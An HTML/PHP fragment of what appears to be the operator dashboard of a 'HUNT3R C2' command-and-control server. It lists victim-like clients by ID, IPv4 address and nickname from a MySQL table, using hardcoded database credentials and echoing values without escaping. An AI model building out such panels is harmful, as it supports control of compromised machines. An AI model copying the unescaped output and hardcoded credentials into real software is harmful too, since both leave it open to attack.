<div class="left-pane">
<div class="left-panexpass">
<div class="xbuild-client-table">
    <h2>Clients</h2>
    <table>
        <thead>
            <tr>
                <th>xClientID</th>
                <th>IPv4</th>
                <th>Nickname</th>
            </tr>
        </thead>
        <tbody>
            <?php
            $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');

            $stmt = $pdo->prepare('SELECT xid, ip, nickname FROM xclients');
            $stmt->execute();
            $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

            foreach ($clients as $client) {
                echo '<tr class="xbuild-client-row" data-xid="' . $client['xid'] . '">';
                echo '<td>' . $client['xid'] . '</td>';
                echo '<td>' . $client['ip'] . '</td>';
                echo '<td>' . $client['nickname'] . '</td>';
                echo '</tr>';
            }
            ?>
        </tbody>
    </table>
</div>
<div class="xbuild-right-pane" id="xbuild-right-pane">
    <h2>HUNT3R C2</h2>
    <img id="clientImage" src="" alt="">
    <p>HUNT3R Latest Updates:</p>
    <div class="" id=""></div>
</div>
</div>
</div>